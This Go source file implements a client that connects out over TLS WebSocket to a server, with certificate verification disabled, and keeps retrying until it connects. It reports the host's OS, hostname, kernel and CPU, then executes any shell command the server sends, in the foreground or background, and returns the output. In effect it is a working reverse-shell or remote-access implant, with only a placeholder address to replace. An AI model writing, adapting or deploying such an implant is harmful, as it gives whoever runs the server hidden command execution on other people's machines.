// 主程序包
package main

import (
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/host"
	"strings"
	"crypto/tls"
	"time"
	"os"
	"os/exec"
)

const (
	HOST string = "127.0.0.1"
	PORT int = 8765
)

type ExecuteCommand struct {
	conn *websocket.Conn
}

// 执行命令并返回结果
func (e *ExecuteCommand) execute_command(command string) map[string]interface{} {
	host_info, _ := host.Info()
	var shell, flag string
	
	if host_info.OS == "windows" {
		shell, flag = "cmd", "/C"
	} else {
		shell, flag = "sh", "-c"
	}

	cmd := exec.Command(shell, flag, command)
	output, err := cmd.CombinedOutput()
	output_str := string(output)
	
	if len(output_str) > 600000 {
		output_str = output_str[:600000]
	}

	result_map := make(map[string]interface{})
	result_map["command"] = command
	result_map["output"] = output_str
	if err != nil {
		result_map["error"] = err.Error()
	}
	result_map["status"] = cmd.ProcessState.ExitCode()
	return result_map
}

// 在后台执行命令
func (e *ExecuteCommand) execute_bg_command(command string) {
	host_info, _ := host.Info()
	var shell, flag string
	
	if host_info.OS == "windows" {
		shell, flag = "cmd", "/C"
	} else {
		shell, flag = "sh", "-c"
	}

	cmd := exec.Command(shell, flag, command)
	_ = cmd.Start()
}

// 更改当前工作目录
func (e *ExecuteCommand) change_directory(directory string) string {
	err := os.Chdir(directory)
	if err != nil {
		return err.Error()
	}
	return "Directory changed successfully"
}

// 获取系统信息
func get_system_info() string {
	hostInfo, err := host.Info()
	if err != nil {
		return "error"
	}
	
	cpuInfo, err := cpu.Info()
	if err != nil {
		return "error"
	}
	
	system := hostInfo.OS
	node := hostInfo.Hostname
	release := hostInfo.PlatformVersion
	version := hostInfo.KernelVersion
	machine := hostInfo.KernelArch
	processor := cpuInfo[0].ModelName
	
	systemInfo := fmt.Sprintf("%s %s %s %s %s %s",
		system, node, release, version, machine, processor)

	return systemInfo
}

// 客户端主循环
func client_loop() {
	// 注意：此处为了简便，跳过了证书验证，如果在生产环境和不受信任的环境中，请删除或注释InsecureSkipVerify: true代码
	tls_config := &tls.Config{
		InsecureSkipVerify: true,
	}
	
	dialer := websocket.Dialer{
		TLSClientConfig: tls_config,
	}
	
	for {
		conn, _, err := dialer.Dial(
			fmt.Sprintf("wss://%s:%d", HOST, PORT),
			nil,
		)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		system_info := get_system_info()
		if err := conn.WriteMessage(websocket.TextMessage, []byte(system_info)); err != nil {
			conn.Close()
			continue
		}

		Executecommand := &ExecuteCommand{conn: conn}
		
		for {
			_, message, err := conn.ReadMessage()
			if err != nil {
				conn.Close()
				break
			}
			
			command := string(message)
			if command == "exit" {
				// 退出命令
				conn.Close()
				return
			} else if strings.HasPrefix(command, "command:") {
				// 执行命令
				command = command[len("command:"):]
				output := Executecommand.execute_command(command)
				if err := conn.WriteJSON(output); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "background:") {
				// 后台执行命令
				command = command[len("background:"):]
				go Executecommand.execute_bg_command(command)
				if err := conn.WriteMessage(websocket.TextMessage, []byte("Command has been sent and executed.")); err != nil {
					conn.Close()
					break
				}
			} else if strings.HasPrefix(command, "change_directory:") {
				// 更改目录
				directory := command[len("change_directory:"):]
				result := Executecommand.change_directory(directory)
				if err := conn.WriteMessage(websocket.TextMessage, []byte(result)); err != nil {
					conn.Close()
					break
				}
			}
		}
	}
}

// 主函数
func main() {
	client_loop()
}
